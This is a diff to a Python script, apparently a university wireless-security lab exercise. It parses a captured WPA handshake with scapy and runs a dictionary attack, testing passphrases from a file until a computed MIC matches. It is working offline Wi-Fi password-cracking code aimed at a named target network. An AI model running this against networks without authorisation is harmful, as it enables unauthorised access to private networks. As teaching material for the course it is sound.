@@ -2,10 +2,12 @@
 # -*- coding: utf-8 -*-
 
 """
-...
+Lecture d'une passphrase depuis un fichier, dérivation des clés depuis cette passphrase, calcul du MIC à partir de ces
+clés, récupération du MIC depuis le dernier message du 4-way handshake et comparaison des deux MICs pour contrôler si
+la passphrase supposée est la bonne.
 """
 
-__author__      = "-"
+__author__      = "Gabriel Roch & Cassandre Wojciechowski"
 __copyright__   = "Copyright 2017, HEIG-VD"
 __license__ 	= "GPL"
 __version__ 	= "1.0"
@@ -14,7 +16,6 @@ __status__ 		= "Prototype"
 
 from scapy.all import *
 from binascii import a2b_hex, b2a_hex
-#from pbkdf2 import pbkdf2_hex
 from pbkdf2 import *
 from numpy import array_split
 from numpy import array
@@ -35,18 +36,21 @@ def customPRF512(key,A,B):
 
 # Read capture file -- it contains beacon, authentication, association, handshake and data
 wpa=rdpcap("wpa_handshake.cap")
+# Network we want to attack
 ssid = "SWI"
 
 for packet in wpa :
-    # Le premier paquet avec le type, le sous-type et le proto à 0 -> Association Request, contient toutes les infos nécessaires
+    # The first packet with type, subtype and proto at 0 is an Association Request
+    # It contains part of the info we seek (MAC address of AP and STA and ssid)
+    # We check if the packet is and Asso Req from the network we want to attack
     if (packet.type == 0x0) and (packet.subtype == 0x0) and (packet.proto == 0x0) and (packet.info.decode('ascii') == ssid):
-        # Adresse MAC de l'AP
+        # AP MAC address
         APmac = a2b_hex((packet.addr1).replace(":", ""))
-        # Adresse de la station
+        # STA MAC address
         Clientmac = a2b_hex((packet.addr2).replace(":", ""))
-        print("Attacking network : ", ssid)
         break
 
+# We look for the Authenticator Nonce in the first key exchange packet
 for packet in wpa :
     if (packet.type == 0x2) and (packet.subtype == 0x0) and (packet.proto == 0x0) :
         #and (APmac == a2b_hex(packet.addr1.replace(":", ""))) and (Clientmac == a2b_hex((packet.addr2).replace(":", ""))) :
@@ -55,6 +59,7 @@ for packet in wpa :
 
 first_packet = True
 
+# We look for the Supplicant Nonce and the MIC in the following packets
 for packet in wpa :
     if first_packet and (packet.type == 0x0) and (packet.subtype == 0x0) and (packet.proto == 0x1) :
         #and (APmac == packet.addr1.replace(":", "")) and (Clientmac == (packet.addr2).replace(":", "")) :
@@ -66,7 +71,12 @@ for packet in wpa :
         mic_to_test = Dot11Elt(packet).load[129:-2].hex()
         break
 
-for passPhrase in ["pouet", "actuelle", "prout"] :
+# We create a list of passphrases from a text file
+with open('passphrases.txt') as file :
+    passphrases = [word for line in file for word in line.split()]
+
+# For each potential passphrase in the file we calculate the MIC
+for passPhrase in passphrases :
     A           = "Pairwise key expansion" #this string is used in the pseudo-random function
     B           = min(APmac,Clientmac)+max(APmac,Clientmac)+min(ANonce,SNonce)+max(ANonce,SNonce) #used in pseudo-random function
     data        = a2b_hex("0103005f02030a0000000000000000000100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000") #cf "Quelques détails importants" dans la donnée
@@ -81,8 +91,10 @@ for passPhrase in ["pouet", "actuelle", "prout"] :
     #calculate MIC over EAPOL payload (Michael)- The ptk is, in fact, KCK|KEK|TK|MICK
     mic = hmac.new(ptk[0:16],data,hashlib.sha1)
 
+    # MIC calculated with key derivated from potential passphrase tested
     current_mic = mic.hexdigest()[:-8]
 
+    # If the MIC calculated above is the same as the one from the last 4-way handshake message, we found the passphrase
     if current_mic == mic_to_test :
         print("Passphrase found : ", passPhrase.decode())
         exit(0)
